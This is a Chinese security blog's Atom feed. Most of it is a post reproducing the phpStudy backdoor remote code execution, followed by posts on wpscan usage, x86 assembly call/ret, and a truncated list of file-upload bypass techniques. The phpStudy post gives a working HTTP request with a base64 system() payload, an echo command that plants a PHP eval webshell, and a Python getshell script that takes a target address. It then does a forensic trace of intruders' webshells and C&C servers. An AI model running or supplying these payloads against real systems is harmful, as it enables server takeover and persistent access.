<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://jinqipiaopiao.github.io/</id>
    <title>Gridea</title>
    <updated>2021-11-07T02:52:44.395Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://jinqipiaopiao.github.io/"/>
    <link rel="self" href="https://jinqipiaopiao.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://jinqipiaopiao.github.io/images/avatar.png</logo>
    <icon>https://jinqipiaopiao.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析]]></title>
        <id>https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/</id>
        <link href="https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/">
        </link>
        <updated>2021-11-03T09:02:02.000Z</updated>
        <content type="html"><![CDATA[<p>文章目录:</p>
<p>1.phpstudy后门检测</p>
<p>2.phpstudy远程RCE后门复现图文教程</p>
<p>3.phpstudy远程RCE后门复现教视频程</p>
<p>3.Python编写复现脚本</p>
<p>4.Python编写批量复现脚本</p>
<p>5.针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</p>
<p>6.修复建议</p>
<p>7.参考</p>
<p>准备工具：</p>
<p>VMware Workstation Pro</p>
<p>Windows7的/ 2008R2</p>
<p>BurpSuiteFree</p>
<p>phpStudy20161103.zip（文中使用）phpStudy20180211.zip</p>
<p>Python</p>
<p><strong>一、phpstudy后门检测：</strong><br>
(1)phpStudy20161103 后门位置存在于：</p>
<pre><code>*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll

*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll
</code></pre>
<p>(2)phpStudy20180211后门位置存在于：</p>
<pre><code>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll

*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932261789.png" alt="" loading="lazy"><br>
(3)找到“ php_xmlrpc，dll”后用记事本打开，“ Ctrl + F”搜索“ @eva ”字符串如果存在就存在后门：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932265747.png" alt="" loading="lazy"><br>
(4)Phpstudy后门分析文章传送门：</p>
<pre><code>https://www.freebuf.com/news/topnews/214912.html

https://www.cppentry.com/bencandy.php?fid=85&amp;id=261791
</code></pre>
<p><strong>二、phpstudy远程RCE后门复现图文教程:</strong><br>
(1)虚拟机搭建好Phpstudy环境，我这里使用的是phpstudy2016版本<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932271003.png" alt="" loading="lazy"><br>
Phpstudy环境192.168.1.91</p>
<p>(2)浏览器访问靶机地址：http：//192.168.1.91/<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932276373.png" alt="" loading="lazy"><br>
(3)浏览器设置本地代理并且打开BurpSuiteFree抓包<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932281265.png" alt="" loading="lazy"><br>
<strong>(4)phpstudy RCE POC：</strong></p>
<pre><code>GET / HTTP/1.1

Host: 192.168.43.99

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0

Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip,deflate

Accept-Charset:&quot;commandbase64 string&quot;

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
</code></pre>
<p><strong>(5)CTRL + R把请求包转发到中继器模块</strong></p>
<p>Accept-Charset:&quot;command base64 string&quot;中执行命令经过了的的Base64编码加密：</p>
<p>执行语句指令：system('whoami');</p>
<p>BASE64 编码后：c3lzdGVtKCd3aG9hbWknKTs =</p>
<p>替换进去</p>
<p>Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=</p>
<p>还要把“ ”中的前面的空格删除。Accept-Encoding: gzip, deflatedeflate</p>
<p><strong>(6)构造好执行语句为WHOAMI的POC如下：</strong></p>
<pre><code>GET / HTTP/1.1

Host: 192.168.1.91

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;rv:69.0) Gecko/20100101 Firefox/69.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip,deflate

Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932289618.png" alt="" loading="lazy"><br>
（whoami执行结果）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932294964.png" alt="" loading="lazy"><br>
（net user执行查询查询查询查询结果）<br>
(7)写入webshel升的操作</p>
<p>可以使用待办事项命令下ECHO 实现</p>
<p>系统（“ write_webshell”）；</p>
<p>(8)完整写出webshel升的语句：</p>
<pre><code>ECHO ^&lt;?php @eval($_POST[cmd]);?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php
</code></pre>
<p>(10)拼接后的语句</p>
<pre><code>system(' ECHO ^&lt;?php@eval($_POST[cmd]); ?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php ');
</code></pre>
<p>(11)拼接好Base64 编码后的代码：</p>
<pre><code>c3lzdGVtKCcgRUNITyBePD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Xj4+IkM6L3BocFN0dWR5L1dXVy9kZW1vbi5waHAgJyk7
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932301784.png" alt="" loading="lazy"><br>
（成功写入的webshel）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932311623.png" alt="" loading="lazy"><br>
（中国蚁剑连接成功）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932316526.png" alt="" loading="lazy"><br>
（ 中国蚁剑链接的webshel升命令执行成功）<br>
<strong>三、Python复现phpstudy远程RCE漏洞：</strong><br>
(1)Python 编写Phpstudy2016 / 2018远程RCE利用脚本代码：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932321772.png" alt="" loading="lazy"></p>
<pre><code>import base64
import requests
print(
'''        ==============================================================================================                    &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;Phpstudy 2016/2018 远程 RCE Getshel工具&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                    [+]By:艾登——皮尔斯                    [+]脚本仅用学习教育目的                    [+]请您务必遵守《中华人民共和国网络安全法》        ==============================================================================================        ''')
def write_shell(url,headers):
r = requests.get(url=url, headers=headers)
cheack_webshell = requests.get(url+&quot;/demon.php&quot;)
if cheack_webshell.status_code == 200:
print(&quot;\n\n[+]{}                Webshell写入成功&quot;.format(url))
else:
print(&quot;\n\n[+]{}                Webshell写入失败&quot;.format(url))
print(&quot;\n=======================================================\n\n&quot;)
while True:
path = input(str(&quot;请你输入绝对路径:&quot;))
url = input(str(&quot;请你输入IP地址/域名:&quot;))
payload_qury = &quot;&quot;&quot;system('ECHO ^&lt;?php @eval($_POST[cmd]); ?^&gt;&gt;&quot;{}/demon.php&quot;');&quot;&quot;&quot;.format(path)
payload = base64.b64encode(payload_qury.encode('utf-8'))
payload = str(payload, 'utf-8')
headers = {
'Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','Accept-Language': 'zh-CN,zh;q=0.9','accept-charset': payload,'Accept-Encoding': 'gzip,deflate','Connection': 'close',}
write_shell(url=url, headers=headers)
</code></pre>
<p>(2)我们可以看到上面的这个Python复现phpstudy远程RCE的脚本针对于单一命令的phpstudy部署的站点例如这种界面额的还比较方便，如果我们不知道绝对路径是不是就不能写入webshell了?????其实这并不会!!!!</p>
<p>(3)针对于phpstudy指针页面无法访问的我们其实可以枚举一下他的物理路径地址即可，不知道绝地路径可以枚举一下物理的绝对理解</p>
<pre><code>Path=['C:/php/WWW',&quot;D:/php/WWW&quot;,&quot;E:/php/WWW&quot;........]
</code></pre>
<p>然后把列表中的绝地地址元素传入函数中递归请求判断即可，这里就不贴出代码了。</p>
<p>(4)与此同时各位老表在进行枚举检测，但是作为一个白帽子，千万不要越过红线。建议大家检测的时候不要写入一句话木马，直接写出一个phpinfo();比较好也是保护了自己。<br>
<strong>四、针对部署phpstudy环境服务器已被入侵的主机进行溯源分析:</strong><br>
(1)我在进行随机检测phpstudy的时候已经发现了部分感染主机被黑帽SEO利用了，用于增加搜索引擎关键词的排名来吸引流量。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932352223.png" alt="" loading="lazy"><br>
(2)部分检测到存在漏洞phpstudy服务器主机网站根目录下高频出现的php一句话木马文件名如下:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932358617.png" alt="" loading="lazy"><br>
(3)下面的这三位仁兄(大黑客)就是通过了echo的方式写入了webshell一句话木马到网站的根目录下进行链接，先放到一边后面在一起做后门取证。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932373575.png" alt="" loading="lazy"><br>
(4)另类的后门“lishunsheng.php”应该是一个人名的拼音，应该是李姓氏的<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932380920.png" alt="" loading="lazy"><br>
ZnB1dHMoZ**wZW4oJy4vdGVzdC5waHAnLCd3KycpLCc8P3BocCBldmFsKCRfUE9TVFtjXSk7Pz4nKTs=</p>
<p>(5)解密后<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932385721.png" alt="" loading="lazy"></p>
<pre><code>fputs(fopen('./test.php','w+'),'&lt;?php eval($_POST[c]);?&gt;');
</code></pre>
<p>(6)写出文件名为&quot;text.php&quot;链接密码为“c”的webshell一句话木马到网站根目录下方</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932390942.png" alt="" loading="lazy"><br>
(7)还有其他的黑客是通过phpmyadmin登录弱口令密码的系统日志文件写入webshell进来的<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932395954.png" alt="" loading="lazy"><br>
2019年9月23日17时30分33秒写入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932400507.png" alt="" loading="lazy"><br>
2019年9月23日18时16分33秒写入webshell<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932408949.png" alt="" loading="lazy"><br>
(8)上面在9月23日写入webshell一句话后，大黑客又通过一句话木马webshell上传了一个文件名为“001122.php”的webshell不死马基本可以先贴个标签是同一个大黑客的攻击入侵行为，在这里也可以看出phpstudy一键部署应该把phpmyadmin的默认密码给修改成随机字符串，此前就有安全团队针对此问题被黑产批量getshell的活动进行了分析。<br>
<strong>五、针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</strong><br>
(1)我们现在已经拿到了那些黑客的的webshell一句话后门文件现在就要开始溯源黑客的IP地址，emmmmm，由于我不能直接登录受感染的主机查看访问日志文件，那么这就会非常的尴尬，但是我突然想起了之前我之前给广东省某市的网络执法机构做了一个用来记录黑客访问webshell一句话时候的IP地址的脚本，并且通过邮件或者微信把信息发送给执法人。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932415604.png" alt="" loading="lazy"><br>
(2)但是在检测之前我需要对他们的webshell一句话木马做一下加工处理，黑客原先留下的webshell代码如下:</p>
<pre><code>&lt;?php

@eval($_POST[ppass]);

?&gt;
</code></pre>
<p>(3)我们加工处理黑客留下的后的webshell代码如下</p>
<pre><code>&lt;?php

$address = $_SERVER['REMOTE_ADDR'];

$referer = $_SERVER['HTTP_REFERER'];

$browser = $_SERVER['HTTP_USER_AGENT'];

$file = fopen(&quot;log.html&quot;,  &quot;a&quot;);  

$time = time();

$now_date= date('Y-m-d H:i:s',$time);

fwrite( $file, &quot;&lt;b&gt;Time:$now_date&lt;/b&gt;&lt;br&gt;&quot; );

fwrite( $file, &quot;&lt;b&gt;IP Address:$address&lt;/b&gt;&lt;br&gt;&quot;);

fwrite( $file, &quot;&lt;b&gt;Referer:$referer&lt;/b&gt;&lt;br&gt;&quot;);  

fwrite( $file, &quot;&lt;b&gt;Browser:$browser&lt;/b&gt;&lt;br/&gt;&lt;hr&gt;&quot;);  

fclose($file);

@eval($_POST[ppass]);

?&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932422821.png" alt="" loading="lazy"><br>
(4)log.html的路径地址可以修改到存放到网站根目录下的其他文件下，避免被发现哈哈哈，</p>
<p>当黑客使用中国菜刀/中国蚁剑访问webshell的时候就会记录下IP地址/访问时间/请求头等信息到log.html文件中</p>
<p>(5)模拟黑客访问webshell前<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932428328.png" alt="" loading="lazy"><br>
(6)模拟黑客访问websell后<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932433179.png" alt="" loading="lazy"><br>
(7)然后本地或者VPS上定时访问请求log.html把最新的访问信息通过Email邮件的方式发送给执法机关/溯源工程师，<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932440617.png" alt="" loading="lazy"><br>
(8)访问检测已经可以达到了秒级，时间的精度也是非常之高。然后就给全部黑客的webshell加工一下，然后我们在调用本地的脚本使用一个并发的请求去请求所有的站点log.html静静等待邮件即可。但是这里并不建议并发请求容易被防火墙封锁IP，所以我就使用了单线线程模式并且使用tiime模块的time.sleep设置了请求延迟，我设置了10秒访问一次。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932449389.png" alt="" loading="lazy"><br>
(9)设置完毕之后就可以直接运行监听脚本了<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932455022.png" alt="" loading="lazy"><br>
(10)在经过十多个小时的等待,我终于等待到了那些大黑客重新访问他们预留下来的Webshell地址了，手机QQ邮箱也收到了邮件通知<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932471034.png" alt="" loading="lazy"><br>
(11)本次等待共获取到144条webshell访问记录，主要的访问IP地址如下:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932478190.png" alt="" loading="lazy"><br>
(12)此外我还注意到网站的根目录文件夹下方被上传了远程木马病毒(方便黑客后期长时间维持权限访问)如下图：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932485387.png" alt="" loading="lazy"><br>
<strong>那么接下来就是进行给黑客入侵画像：</strong><br>
<strong>(1)Windows7 64bit System 虚拟机样本未运行初始化状态</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932491344.png" alt="" loading="lazy"><br>
(2)执行cd.exe程序后本地端口49189端口被占用，链接的外部C&amp;C的上线地址:114.67.65.156:8081</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932498069.png" alt="" loading="lazy"><br>
(3)查壳:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932505182.png" alt="" loading="lazy"><br>
<strong>UPX压缩壳使用C++编写的win32木马程序</strong></p>
<p><strong>火绒剑分析:</strong><br>
(1)运行后会删除自身文件(cd.exe)并且会复制自身到C:\Windows下方<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932521335.png" alt="" loading="lazy"></p>
<pre><code>C:\Windows\system32\cmd.exe&quot; /c del C:\Users\ADMINI~1\Desktop\cd.exe &gt; null
</code></pre>
<p>删除母体<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932529492.png" alt="" loading="lazy"><br>
写入木马文件到C:\Windows\目录下</p>
<p>(2)注册行为:修改了以下注册表以此降低Internet安全设置。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932541636.png" alt="" loading="lazy"><br>
(3)向网关地址发送数据包：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932549334.png" alt="" loading="lazy"><br>
(4)与114.67.65.156:8081C&amp;C上线服务器地址建立TCP通信链接<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932555222.png" alt="" loading="lazy"><br>
114.67.65.156主机3389端口开放(Windows主机无疑)<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932561148.png" alt="" loading="lazy"><br>
(5)开启了web服务80端口访问IP发现有一个网站<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932569605.png" alt="" loading="lazy"><br>
(6)发现是一个做SEO的泛微目录的站点，留意到网站上面留下了这个站长的微信二维码<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932588873.png" alt="" loading="lazy"><br>
微信号尾号为H****553YM</p>
<p>QQ:64****08</p>
<p>就先叫他53YM大黑客<br>
(7)纯真IP库查询IP的归属地指向了一家名为&quot;北京市 凯达永易科技(北京)有限公司&quot;的公司<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932595542.png" alt="" loading="lazy"><br>
去天眼查网站查询这家公司发现公司已注销<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932605318.png" alt="" loading="lazy"><br>
(8)然后我顺便去Google搜索了一下这个C&amp;C上线地址,发现已经有安全团队分析了类似样本</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932617274.png" alt="" loading="lazy"><br>
2018.exe 211.149.225.80:3313(大灰狼木马)</p>
<p>inJoin.ps1是一个远程注入工具该PowerShell脚本具有3个基本功能集：<br>
DLL注入<br>
DLL注入简单地定义为将DLL插入另一个进程的空间然后执行其代码的过程。以下是OpenSecurityResearch博客文章中对此过程进行简化的可视化视图：<br>
1.）将DLL反映性地加载到PowerShell进程中</p>
<p>远程或本地运行时，可以将DLL输出返回给用户。</p>
<p>DLL完成执行后，清理PS进程中的内存。</p>
<p>2.）将EXE反射性地加载到PowerShell进程中。</p>
<p>远程运行时无法将EXE输出返回给用户。如果需要远程输出，则必须使用DLL。如果在本地运行，则可以返回EXE输出。</p>
<p>DLL完成执行后，清理PS进程中的内存。</p>
<p>非常适合运行EXE的现有渗透测试工具，而无需触发过程监控警报。</p>
<p>3.）以反射方式将DLL注入到远程进程中。</p>
<p>在远程或本地运行时，无法将DLL输出返回给用户。</p>
<p>如果DLL完成执行，则不清理远程进程中的内存。</p>
<p>非常适合通过将后门DLL注入另一个进程内存来在系统上植入后门。</p>
<p>期望DLL具有此功能：void VoidFunc（）。这是在DLL加载后将被调用的函数。</p>
<p>如果通俗点用人话来讲就是利用PowerShell来远程注入DLL的脚本</p>
<p>此PowerShell项目的Github项目地址:</p>
<pre><code>https://github.com/clymb3r/PowerShell
</code></pre>
<p>此PowerShell项目作者的说明：</p>
<pre><code>https://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932627565.png" alt="" loading="lazy"><br>
这里的江西赣州的黑客所使用的就是上图红圈选圈中的PowerShell脚本</p>
<p>然后查看他一下他的PowerShell脚本<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932640308.png" alt="" loading="lazy"><br>
其中$InputString是黑客把自己的恶意的二进制文件通过Base64转写后的字符串信息</p>
<pre><code>在通过PowerShell[System.Convert]::FromBase64String的方法是为上面二进制文件加密的字符串信息进行解密执行
</code></pre>
<p>InputString中Base64编码的字符串解密还原后为Metasploit生成的二进制文件。</p>
<p>PowerShell还原解密方式:</p>
<pre><code>$Base64Bytes = Get-Content (base64.txt)
$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
Set-Content calc.exe -Value $PEBytes
</code></pre>
<p>C#还原解密方式：</p>
<pre><code>using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
namespace test1
{
class Program
{
static void Main(string[] args)
{
byte[] AsBytes = File.ReadAllBytes(@&quot;C:\test\base64.txt&quot;);
String AsBase64String = Convert.FromBase64String(AsBytes);
StreamWriter sw = new StreamWriter(@&quot;C:\test\calc.exe&quot;);
sw.Write(AsBase64String);
sw.Close();
}
}
}
</code></pre>
<p>这个江西赣州的黑客够专业我喜欢<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932652689.png" alt="" loading="lazy"><br>
inJoin.ps1 上线地址为117.21.224.222:9898</p>
<p>木马文件名及上线地址如下图所示：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932661253.png" alt="" loading="lazy"><br>
修复建议:<br>
1.前往官网下载phpstudy下载最新版本</p>
<p>2.修改服务器密码，检查系统日志文件，下载安装火绒杀毒软件进行全盘查杀病毒后门，以防生产环境被入侵者留下后门</p>
<p>2.开发人员应该尽量在生产环境中杜绝使用一键部署类型的软件和脚本防止软件留有后门，导致服务器病毒木马入侵</p>
<p>3.关注多一些风险预警平台&quot;微步&quot;/或者关注威胁情报收集的微信公众号&quot;黑鸟&quot;还有就是我的winway-鱼蛋师傅的漏洞挖掘公众号&quot;快识&quot;。</p>
<p>参考:<br>
<strong>phpStudy后门简要分析：</strong></p>
<p>http://www.freebuf.com/others-articles/215406.html</p>
<p>数十万PhpStudy用户被植入后门，快来检测你是否已沦为“肉鸡”！:</p>
<p>https://www.freebuf.com/news/topnews/214912.html</p>
<p>杭州警方通报打击涉网违法犯罪暨'净网2019'专项行动战果</p>
<p>https://mp.weixin.qq.com/s/s-5cVTxIJcDfdRjtnEnI0g</p>
<p>病毒团伙利用phpStudy RCE漏洞批量抓鸡，下发四个远控木马</p>
<p>https://www.4hou.com/system/20637.html</p>
<p>渗透技巧——通过cmd上传文件的N种方法</p>
<p>https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html<br>
本文作者：艾登——皮尔斯， 属于FreeBuf原创奖励计划，未经许可禁止转载，这里我只是借来参考一下</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[wpscan]]></title>
        <id>https://jinqipiaopiao.github.io/post/wpscan/</id>
        <link href="https://jinqipiaopiao.github.io/post/wpscan/">
        </link>
        <updated>2021-11-02T12:01:25.000Z</updated>
        <content type="html"><![CDATA[<p>首先得去官网申请api-token值（不然就会报以下的错）<br>
[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.<br>
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</p>
<p>然后当你有了token值之后你就可以用命令行后面直接加api-token值即可<br>
如：</p>
<pre><code>先更新wpscan --update然后就可以使用了如果出现报错就说明是凯莉有问题换一个镜像就好了    
wpscan --url http://219.153.49.228:49425/ --api-token *****
</code></pre>
<p>当扫描出现红色的结果的时候说明就是扫描结束也即成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635855185383.png" alt="" loading="lazy"></p>
<p>然后接下来就是把结果拷贝到word里面直接找CVE然后利用漏洞</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[汇编语言]]></title>
        <id>https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/</id>
        <link href="https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/">
        </link>
        <updated>2021-10-27T01:57:35.000Z</updated>
        <content type="html"><![CDATA[<p><strong>call与ret</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635299906733.png" alt="" loading="lazy"><br>
ax=6    (因为只跳了一次)<br>
<strong>1、call + 标号</strong></p>
<p>这个指令是先将call + 标号的下一条语句的IP放入栈中，然后使当前的IP+16位位移</p>
<p>看到上面的解释会让你想到什么？会想到jmp指令吧，jmp有个指令格式是：jmp near ptr 标号，这里的call唯一这种jmp多的一步就是多了一次入栈操作；</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635299950672.png" alt="" loading="lazy"><br>
ax=1000+9*2 (跳了两次)<br>
<strong>2、call far ptr + 标号</strong></p>
<p>这个指令是先将call指令的下一个指令的代码段地址入栈，再把call下一条指令的偏移地址入栈，然后使其跳到标号所在处</p>
<p>这又会让你想到什么？还是jmp指令，jmp指令的： jmp far ptr 标号， 这种jmp的使用是在段间转移的，这种call和jmp的区别就是多了两次入栈的操作；</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635299988485.png" alt="" loading="lazy"><br>
<strong>3、call + 16位寄存器</strong></p>
<p>这个指令先将call的下一条指令的IP入栈，然后再以ax为IP的代码处</p>
<p>这还是会想到jmp指令：jmp + 16位寄存器，这里的call唯一比jmp多的一步就是多了一步入栈操作；</p>
<p>再来：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635300241997.png" alt="" loading="lazy"><br>
<strong>4、call word ptr + 内存单元地址(sp的值因为是一个字也就是两个字节所以应该减2)</strong></p>
<p>这个指令的是先将call指令的下一条指令的IP入栈，然后跳到以内存单元地址为IP的代码处</p>
<p>这里同样还是会联想到jmp指令的：jmp word ptr + 内存单元地址，这里的call比jmp多的一步同样是入栈的操作；</p>
<p>最后的：</p>
<p><strong>5、call dword ptr + 内存单元地址(sp的值因为是2个字也就是4个字节所以应该减4)</strong></p>
<p>这个指令先将call指令的下一条指令的CS入栈，再将call指令的下一条指令的IP入栈，然后跳到以内存单元的高位为CS，低位为IP的代码处</p>
<p>这里还是会想到jmp指令：jmp dword ptr + 内存单元地址，这里的call和jmp的区别还是多了入栈的操作</p>
<p>综上所述：</p>
<p><strong>call指令：</strong></p>
<p>第一步：先将call指令的下一条指令的CS和IP入栈（当然如果是段间转移就要将CS和IP入栈，如果是段内转移就只要将IP入栈）</p>
<p>第二步：就是操作与call对应的jmp指令</p>
<p>所有的call指令都是可以用上面的两步来确定的，这是个通用的法则。</p>
<p><strong>ret和retf</strong></p>
<p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；</p>
<p>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p>
<p>CPU执行ret指令时，进行下面的两步操作：</p>
<p>（1）(IP) = ((ss)*16 +(sp))</p>
<p>（2）(sp) = (sp)+2</p>
<p>CPU执行retf指令时，进行下面四步操作：</p>
<p>（1）(IP) = ((ss)*16) + (sp)</p>
<p>（2）(sp) = (sp) + 2</p>
<p>（3）(CS) = ((ss)*16) + (sp)</p>
<p>（4）(sp) = (sp) + 2</p>
<p>用汇编语法来解释ret和retf指令，则：</p>
<p>CPU执行ret指令时，相当于进行：</p>
<p>pop IP</p>
<p>CPU执行retf指令时，相当于进行：</p>
<p>pop IP</p>
<p>pop CS<br>
————————————————<br>
版权声明：本文为CSDN博主「轩落_翼」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_23880193/article/details/42317797</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[浅谈文件上传漏洞]]></title>
        <id>https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/</id>
        <link href="https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/">
        </link>
        <updated>2021-10-10T01:12:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x00-文件上传漏洞描述">0x00 文件上传漏洞描述</h1>
<p><strong>漏洞原理：</strong><br>
由于程序员在编写代码时候在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，简单的来说就是服务器端没有对客户端上传的文件进行严格验证或过滤,用户可以上传一个可执行的脚本文件,并通过此脚本获得了执行服务器端命令的能力而引发危害。<br>
<strong>漏洞危害：</strong><br>
1.针对上传功能的Dos攻击<br>
2.使上传文件在服务器上作为脚本执行<br>
3.诱使用户下载恶意文件<br>
4.越权下载文件</p>
<p>一切可以上传文件的位置皆可能存在文件上传漏洞！</p>
<p><strong>0x01 漏洞的绕过技术总结</strong><br>
首先将绕过分为前端绕过与后端绕过</p>
<p>1）前端绕过：</p>
<p>指数据上传后为提交到服务器，而是由于网站页面的js对其进行过滤，确认是否可以上传,删除限制上传js规则即可</p>
<p>2）后端绕过：</p>
<p><strong>黑名单：</strong></p>
<p>1.特殊解析后缀绕过</p>
<p>2.htaccess解析绕过</p>
<p>3.大小写绕过</p>
<p>4.点绕过</p>
<p>5.空格绕过</p>
<p>6.::$$DATA数据流绕过</p>
<p>7.配合解析绕过</p>
<p>8.双后缀解析绕过</p>
<p><strong>白名单：</strong><br>
1.MIME绕过<br>
2.%00截断<br>
3.0x00截断<br>
4.0x0a截断</p>
<p><strong>其他类型：</strong></p>
<p>1.条件头检测</p>
<p>2.二次渲染</p>
<p>3.条件竞争</p>
<p>4.突破getimagesize</p>
<p>5.突破exif_imagetype</p>
<p><strong>0x02 黑名单，白名单漏洞绕过技术案例</strong><br>
<strong>黑名单绕过</strong><br>
<strong>1）黑名单-特殊解析后缀绕过-upload-labs-03</strong><br>
黑名单限制php上传，但apache对php3.php5.phtml等也可以直接解析为php，故可将php后缀改为php3等，如果上传成功.php3,如果Apache不能解析，在Apache的配置文件httpd.conf文件中添语句php3即可</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633828436455.png" alt="" loading="lazy"><br>
上传即可，若解析不超过可能是apache版本过高</p>
<p><strong>2)黑名单-.htaccess解析绕过-upload-labs-04</strong><br>
